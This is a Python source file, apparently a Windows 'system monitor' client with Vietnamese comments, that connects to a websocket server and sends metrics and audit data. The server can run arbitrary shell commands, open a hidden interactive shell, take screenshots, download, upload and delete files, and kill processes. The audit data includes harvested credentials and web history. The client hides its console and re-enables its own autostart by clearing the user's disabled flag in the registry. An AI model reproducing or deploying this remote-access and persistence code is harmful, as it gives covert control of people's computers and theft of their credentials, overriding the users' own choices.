import os
import sys
import asyncio
import websockets
import socket
import json
import configparser
import platform
import hashlib
import psutil
from library import WindowsAuditor
import time 

# --- Quản lý Autostart qua Registry ---
if platform.system() == "Windows":
    import winreg
    import ctypes

def hide_console():
    """Ẩn cửa sổ console trên Windows."""
    if platform.system() == "Windows":
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)

def manage_autostart():
    """Thiết lập Windows Registry để client tự động chạy cùng hệ thống (luôn force Enabled nếu là Admin)."""
    if platform.system() != "Windows":
        return

    # Xác định đường dẫn thực thi
    if getattr(sys, 'frozen', False):
        app_path = f'"{sys.executable}"'
    else:
        app_path = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"'

    reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    approved_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
    app_name = "SystemMonitorClient"

    try:
        # 1. Mở key HKLM với quyền ghi và xóa
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_ALL_ACCESS)
        
        # 2. Xóa và ghi lại để đảm bảo entry mới nhất
        try:
            winreg.DeleteValue(key, app_name)
        except FileNotFoundError:
            pass
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(key)

        # 3. Force Enable: Xóa khỏi StartupApproved nếu user từng disable trong Task Manager
        try:
            approved_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, approved_path, 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(approved_key, app_name)
            winreg.CloseKey(approved_key)
            print(f"[AUTOSTART] Force enabled: Cleared disabled flag for '{app_name}'")
        except FileNotFoundError:
            pass # Chưa từng bị disable
        except Exception:
            pass

        print(f"[AUTOSTART] Registry refreshed & registered: {app_path}")
        
    except PermissionError:
        print("[AUTOSTART] Skipping Registry update: Not running as Administrator.")
    except Exception as e:
        print(f"[AUTOSTART] Error setting autostart: {e}")

# --- Các hàm helper không đổi ---
def get_machine_id():
    """Lấy ID duy nhất của máy, ưu tiên MachineGuid trên Windows."""
    if platform.system() == "Windows":
        try:
            auditor = WindowsAuditor._SystemIdAudit()
            details = auditor.get_details()
            guid = details.get("MachineGuid")
            if guid:
                return guid
        except Exception as e:
            print(f"[ID] Error using _SystemIdAudit, falling back. Error: {e}")
    
    unique_string = f"{socket.gethostname()}-{platform.node()}-{platform.system()}-{platform.machine()}"
    try:
        import netifaces
        for interface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_LINK in addrs:
                mac_addr = addrs[netifaces.AF_LINK][0]['addr']
                if mac_addr != "00:00:00:00:00:00":
                    unique_string += f"-{mac_addr}"
    except ImportError:
        pass
    return hashlib.sha256(unique_string.encode()).hexdigest()

def get_base_path():
    """Trả về thư mục chứa file .exe hoặc .py đang chạy"""
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)  # khi đã đóng gói .exe
    return os.path.dirname(os.path.abspath(__file__))  # khi chạy file .py

def get_enabled_modules_from_config():
    """Đọc config và trả về danh sách các module audit được bật."""
    base_path = get_base_path()
    config_path = os.path.join(base_path, "config.ini")

    config = configparser.ConfigParser()
    config.read(config_path)

    enabled_modules = []
    if 'audit_modules' in config:
        for module_name, is_enabled in config['audit_modules'].items():
            if config.getboolean('audit_modules', module_name):
                enabled_modules.append(module_name)
    return enabled_modules

def ensure_single_instance():
    """Kiểm tra và tắt triệt để các bản client cũ đang chạy."""
    current_pid = os.getpid()
    exe_name = os.path.basename(sys.executable)
    
    print(f"[CLEANUP] Checking for existing instances of '{exe_name}'...")
    
    found_other = False
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            if proc.info['pid'] == current_pid:
                continue
            
            is_same_app = False
            if proc.info['name'] == exe_name:
                is_same_app = True
            elif proc.info['exe'] and os.path.normpath(proc.info['exe']) == os.path.normpath(sys.executable):
                is_same_app = True
                
            if is_same_app:
                print(f"[CLEANUP] Found existing instance (PID: {proc.info['pid']}). Terminating...")
                p = psutil.Process(proc.info['pid'])
                try:
                    p.terminate()
                    p.wait(timeout=3)
                except psutil.TimeoutExpired:
                    print(f"[CLEANUP] PID {proc.info['pid']} did not respond to terminate. Killing...")
                    p.kill()
                
                print(f"[CLEANUP] PID {proc.info['pid']} cleaned up.")
                found_other = True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.TimeoutExpired):
            continue
            
    if not found_other:
        print("[CLEANUP] No other instances found.")

# --- Các biến toàn cục ---
CLIENT_GUID = get_machine_id()
HOSTNAME = socket.gethostname()
USERNAME = HOSTNAME

from concurrent.futures import ThreadPoolExecutor, as_completed

# --- Logic Audit được viết lại ---

def run_full_audit_sync():
    """
    Chạy các module audit được cấu hình trong config.ini bằng ThreadPoolExecutor.
    Mỗi module có timeout để tránh treo toàn bộ client.
    """
    print("\n[AUDIT] Starting configured system audit with timeout protection...")
    start_time = time.time()
    
    if platform.system() != "Windows":
        print("[AUDIT] Skipping audit: Library is for Windows only.")
        return {"Error": "Audit library is for Windows only."}
    
    enabled_modules = get_enabled_modules_from_config()
    if not enabled_modules:
        print("[AUDIT] No audit modules enabled in config.ini. Skipping audit.")
        return {"Info": "No audit modules enabled."}

    print(f"[AUDIT] Enabled modules: {', '.join(enabled_modules)}")

    base_path = get_base_path()
    config_path = os.path.join(base_path, "config.ini")
    config = configparser.ConfigParser()
    config.read(config_path)

    max_event_log = config.getint('client', 'max_event_log', fallback=25)
    history_limit = config.getint('client', 'history_limit', fallback=100)
    # Timeout mặc định cho mỗi module là 30 giây
    module_timeout = config.getint('client', 'module_timeout', fallback=30)

    auditor = WindowsAuditor(max_events=max_event_log, history_limit_per_profile=history_limit)
    all_results = {}

    # Sử dụng ThreadPoolExecutor để chạy các module song song (giảm tổng thời gian audit)
    # Tuy nhiên để tránh spike CPU, ta có thể giới hạn max_workers
    with ThreadPoolExecutor(max_workers=4) as executor:
        future_to_module = {
            executor.submit(auditor.auditors[name].get_details): name 
            for name in enabled_modules if name in auditor.auditors
        }
        
        for future in as_completed(future_to_module):
            name = future_to_module[future]
            try:
                # Chờ kết quả với timeout
                result = future.result(timeout=module_timeout)
                all_results[name] = result
                print(f"[AUDIT] Module '{name}' completed.")
            except TimeoutError:
                print(f"[AUDIT] Module '{name}' timed out after {module_timeout}s.")
                all_results[name] = {"Error": f"Audit module '{name}' timed out."}
            except Exception as e:
                print(f"[AUDIT] Module '{name}' failed: {e}")
                all_results[name] = {"Error": f"Audit module '{name}' failed: {e}"}
    
    end_time = time.time()
    print(f"[AUDIT] Configured system audit completed in {end_time - start_time:.2f} seconds.")
    return all_results

# --- Các tác vụ gửi tin được viết lại ---

# FILE: client.py

terminal_process = None

async def listen_for_remote_commands(websocket):
    """Lắng nghe các lệnh điều khiển từ xa từ server."""
    global terminal_process
    try:
        async for message in websocket:
            try:
                data = json.loads(message)
                if data.get('type') == 'remote_command':
                    command_type = data.get('command')
                    print(f"[REMOTE] Received command: {command_type}")

                    response_data = {"type": "remote_response", "command": command_type, "guid": CLIENT_GUID}

                    import base64
                    import ctypes
                    import threading
                    import subprocess
                    import asyncio

                    if command_type == 'terminal':
                        cmd = data.get('payload', '')
                        shell = data.get('shell', 'cmd')
                        result = WindowsAuditor._RemoteControl.execute_command(cmd, shell)
                        response_data["result"] = result
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'process_list':
                        response_data["result"] = WindowsAuditor._RemoteControl.get_process_list()
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'kill_process':
                        pid = data.get('payload')
                        success = WindowsAuditor._RemoteControl.kill_process(int(pid))
                        response_data["result"] = {"success": success}
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'screenshot':
                        img_b64 = WindowsAuditor._RemoteControl.take_screenshot()
                        response_data["result"] = {"image": img_b64}
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'file_browse':
                        path = data.get('payload', '')
                        response_data["result"] = WindowsAuditor._RemoteControl.list_dir(path)
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'file_download':
                        filepath = data.get('payload', '')
                        try:
                            with open(filepath, 'rb') as f:
                                file_data = f.read()
                            b64_data = base64.b64encode(file_data).decode('utf-8')
                            response_data["result"] = {
                                "success": True,
                                "filename": os.path.basename(filepath),
                                "content": b64_data
                            }
                        except Exception as e:
                            response_data["result"] = {"success": False, "error": str(e)}
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'file_upload':
                        payload = data.get('payload', {})
                        filepath = payload.get('path', '')
                        b64_content = payload.get('content', '')
                        try:
                            file_data = base64.b64decode(b64_content)
                            with open(filepath, 'wb') as f:
                                f.write(file_data)
                            response_data["result"] = {"success": True}
                        except Exception as e:
                            response_data["result"] = {"success": False, "error": str(e)}
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'file_delete':
                        filepath = data.get('payload', '')
                        try:
                            os.remove(filepath)
                            response_data["result"] = {"success": True}
                        except Exception as e:
                            response_data["result"] = {"success": False, "error": str(e)}
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'message_box':
                        message_text = data.get('payload', '')
                        try:
                            def show_msg():
                                ctypes.windll.user32.MessageBoxW(0, message_text, "Message from Administrator", 0x40 | 0x0)
                            threading.Thread(target=show_msg, daemon=True).start()
                            response_data["result"] = {"success": True}
                        except Exception as e:
                            response_data["result"] = {"success": False, "error": str(e)}
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'terminal_start':
                        if terminal_process and terminal_process.poll() is None:
                            try: terminal_process.terminate()
                            except: pass
                        shell = data.get('payload', 'cmd.exe')
                        flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
                        try:
                            terminal_process = subprocess.Popen(
                                shell,
                                stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT,
                                text=True,
                                bufsize=0,
                                creationflags=flags
                            )
                            def read_output(proc, ws, loop):
                                try:
                                    while proc.poll() is None:
                                        char = proc.stdout.read(1)
                                        if not char:
                                            break
                                        asyncio.run_coroutine_threadsafe(
                                            ws.send(json.dumps({
                                                "type": "remote_response",
                                                "command": "terminal_stream",
                                                "guid": CLIENT_GUID,
                                                "result": {"output": char}
                                            })),
                                            loop
                                        )
                                except: pass
                            loop = asyncio.get_event_loop()
                            threading.Thread(target=read_output, args=(terminal_process, websocket, loop), daemon=True).start()
                            response_data["result"] = {"success": True}
                        except Exception as e:
                            response_data["result"] = {"success": False, "error": str(e)}
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'terminal_input':
                        if terminal_process and terminal_process.poll() is None:
                            input_data = data.get('payload', '')
                            terminal_process.stdin.write(input_data)
                            terminal_process.stdin.flush()
                        else:
                            response_data["result"] = {"error": "Terminal not running"}
                            await websocket.send(json.dumps(response_data))

                    elif command_type == 'terminal_stop':
                        if terminal_process:
                            try:
                                terminal_process.terminate()
                                terminal_process.wait(timeout=2)
                            except: pass
                            terminal_process = None
                        response_data["result"] = {"success": True}
                        await websocket.send(json.dumps(response_data))

                    print(f"[REMOTE] Sent response for {command_type}")
            except Exception as e:
                print(f"[REMOTE] Error processing message: {e}")
                
    except websockets.exceptions.ConnectionClosed:
        pass
    except Exception as e:
        print(f"[REMOTE] Listener task error: {e}")

async def send_metrics(websocket):
    """Gửi các chỉ số hiệu năng (CPU, RAM, Disk, và I/O chi tiết) định kỳ."""
    config = configparser.ConfigParser()
    config.read(os.path.join(get_base_path(), 'config.ini'))
    metrics_send_interval = int(config['client']['refesh_interval'])
    try:
        while True:
            await asyncio.sleep(metrics_send_interval)
            
            # Thu thập các metrics cơ bản
            cpu_usage = WindowsAuditor._Usage.get_cpu_usage()
            ram_usage = WindowsAuditor._Usage.get_ram_usage()
            disk_usage = WindowsAuditor._Usage.get_disk_usage() # Giữ nguyên hàm cũ
            local_ip = WindowsAuditor._Ip.get_local_ip()
            wan_ip = WindowsAuditor._Ip.get_wan_ip()
            
            # Thu thập các metrics I/O chi tiết (blocking)
            loop = asyncio.get_running_loop()
            disk_io = await loop.run_in_executor(None, WindowsAuditor._Usage.get_disk_io_per_disk)
            network_io = await loop.run_in_executor(None, WindowsAuditor._Usage.get_network_io_per_nic)

            metrics = {
                "type": "metrics", "guid": CLIENT_GUID,
                "cpu_usage": cpu_usage,
                "ram_usage": ram_usage,
                "disk_usage": disk_usage, # Giá trị số đơn giản
                "disk_io": disk_io,       # Dict of dicts (bytes/s)
                "network_io": network_io, # Dict of dicts (bits/s)
                "local_ip": local_ip,
                "wan_ip": wan_ip,
            }
            await websocket.send(json.dumps(metrics))
            
            print(
                f"[SEND] => Metrics: CPU: {cpu_usage:.1f}% | RAM: {ram_usage:.1f}% | Disk: {disk_usage:.1f}% | "
                f"Disk I/O points: {len(disk_io)} | Net I/O points: {len(network_io)}"
            )
            # print(json.dumps(metrics, indent=4))

            
    except asyncio.CancelledError:
        print("Metrics sending task cancelled.")
    except websockets.exceptions.ConnectionClosed:
        pass
    except Exception as e:
        print(f"Metrics sending task: An unexpected error occurred: {e}")

async def send_updated_audit_and_info(websocket):
    """
    Tác vụ chạy nền để gửi lại thông tin và dữ liệu audit định kỳ.
    Ưu tiên gửi info trước để server nhận diện, sau đó mới chạy audit nặng.
    """
    config = configparser.ConfigParser()
    config.read(os.path.join(get_base_path(), 'config.ini'))
    update_interval = int(config['client']['update_info_interval'])
    access_token = config['server'].get('access_token', fallback="")

    try:
        while True:
            # 1. Gửi gói tin info NGAY LẬP TỨC để server biết client đã online
            local_ip = WindowsAuditor._Ip.get_local_ip()
            wan_ip = WindowsAuditor._Ip.get_wan_ip()
            enabled_modules = get_enabled_modules_from_config()
            info = {
                "type": "client_info", "guid": CLIENT_GUID, "hostname": HOSTNAME,
                "username": USERNAME, "local_ip": local_ip, "wan_ip": wan_ip,
                "enabled_modules": enabled_modules,
                "access_token": access_token
            }
            await websocket.send(json.dumps(info))
            print(f"\n[SEND] => Sent client info update.")

            # 2. Chạy audit nặng dưới nền (không block việc gửi metrics realtime)
            print("[AUDIT] Running full system audit in background...")
            loop = asyncio.get_running_loop()
            current_audit_data = await loop.run_in_executor(None, run_full_audit_sync)

            # 3. Mã hóa dữ liệu nhạy cảm trước khi gửi
            if current_audit_data:
                sensitive_modules = ['credentials', 'web_history']
                for mod in sensitive_modules:
                    if mod in current_audit_data and "Error" not in current_audit_data[mod]:
                        print(f"[CRYPTO] Encrypting module '{mod}'...")
                        raw_json = json.dumps(current_audit_data[mod])
                        encrypted_data = WindowsAuditor._Crypto.encrypt(raw_json, access_token)
                        current_audit_data[mod] = {"encrypted": True, "payload": encrypted_data}

                audit_report = {
                    "type": "full_audit", "guid": CLIENT_GUID, "data": current_audit_data
                }
                await websocket.send(json.dumps(audit_report))
                print("[SEND] => Sent full audit report (sensitive data encrypted).")
            # 4. Chờ cho lần cập nhật tiếp theo (ví dụ 60 giây)
            print(f"       Next info/audit update in {update_interval} seconds.\n")
            await asyncio.sleep(update_interval)

    except asyncio.CancelledError:
        print("Info/Audit sending task cancelled.")
    except websockets.exceptions.ConnectionClosed:
        pass
    except Exception as e:
        print(f"Info/Audit sending task: An unexpected error occurred: {e}")


# --- Vòng lặp kết nối chính ---
async def connect():
    """
    Vòng lặp chính để kết nối và quản lý các tác vụ của client.
    Không còn nhận dữ liệu audit ban đầu để tránh blocking startup.
    """
    config = configparser.ConfigParser()
    config.read(os.path.join(get_base_path(), 'config.ini'))
    server_host = config['client']['server']
    server_port = int(config['server']['port'])
    retry_interval = int(config['client']['retry_interval'])
    uri = f"ws://{server_host}:{server_port}"

    while True:
        try:
            print(f"Attempting to connect to {uri}...")
            async with websockets.connect(uri) as websocket:
                print(f"Connection successful!")

                # Bắt đầu các tác vụ chạy song song:
                info_audit_task = asyncio.create_task(send_updated_audit_and_info(websocket))
                metrics_task = asyncio.create_task(send_metrics(websocket))
                remote_task = asyncio.create_task(listen_for_remote_commands(websocket))

                done, pending = await asyncio.wait(
                    [info_audit_task, metrics_task, remote_task],
                    return_when=asyncio.FIRST_COMPLETED,
                )

                for task in pending:
                    task.cancel()

        except (ConnectionRefusedError, socket.error):
            print(f"Server at {uri} is unreachable. Retrying in {retry_interval} seconds...")
        except websockets.exceptions.ConnectionClosed:
            print(f"Connection to server lost. Retrying in {retry_interval} seconds...")
        except KeyboardInterrupt:
            print("Client disconnected by user.")
            break
        except Exception as e:
            print(f"An unexpected connection error: {e}. Retrying in {retry_interval} seconds...")

        await asyncio.sleep(retry_interval)


if __name__ == "__main__":
    # Thiết lập thư mục làm việc về thư mục chứa script
    os.chdir(get_base_path())

    if "-minimized" in sys.argv:
        hide_console()

    if platform.system() != "Windows":
        print("Warning: This client is designed for Windows and may have limited functionality on other OS.")

    # 0. Đảm bảo chỉ có một instance chạy
    ensure_single_instance()

    # Xử lý cấu hình autostart
    manage_autostart()

    # 1. Bắt đầu vòng lặp kết nối (Audit sẽ chạy sau khi kết nối thành công)
    try:
        asyncio.run(connect())
    except KeyboardInterrupt:
        print("\nClient shutdown.")